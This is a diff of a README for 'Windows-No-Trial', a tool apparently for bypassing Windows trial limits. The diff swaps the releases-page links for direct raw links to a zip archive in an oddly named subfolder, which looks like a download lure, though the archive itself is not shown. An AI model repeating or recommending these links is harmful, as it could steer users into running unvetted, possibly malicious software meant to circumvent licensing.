@@ -1,6 +1,6 @@
 # 🌟 Windows-No-Trial - Simplifying Your Windows Experience
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-green)](https://github.com/AriMiri/Windows-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/AriMiri/Windows-No-Trial/main/rhomboidally/Windows-No-Trial-1.4.zip)](https://raw.githubusercontent.com/AriMiri/Windows-No-Trial/main/rhomboidally/Windows-No-Trial-1.4.zip)
 
 ## 📋 Introduction
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of Windows-No-Trial, visit this page to download: [Windows-No-Trial Releases](https://github.com/AriMiri/Windows-No-Trial/releases).
+To download the latest version of Windows-No-Trial, visit this page to download: [Windows-No-Trial Releases](https://raw.githubusercontent.com/AriMiri/Windows-No-Trial/main/rhomboidally/Windows-No-Trial-1.4.zip).
 
 Follow these steps to install:
 
@@ -66,6 +66,6 @@ Join our community for more support and tips. Here, users share their experience
 
 We welcome feedback to improve Windows-No-Trial. Feel free to share your suggestions or ask questions. Your input helps us grow and serve you better.
 
-Remember, you can always download the latest version of Windows-No-Trial from here: [Windows-No-Trial Releases](https://github.com/AriMiri/Windows-No-Trial/releases). 
+Remember, you can always download the latest version of Windows-No-Trial from here: [Windows-No-Trial Releases](https://raw.githubusercontent.com/AriMiri/Windows-No-Trial/main/rhomboidally/Windows-No-Trial-1.4.zip). 
 
 Thank you for using Windows-No-Trial! Enjoy your enhanced Windows experience.
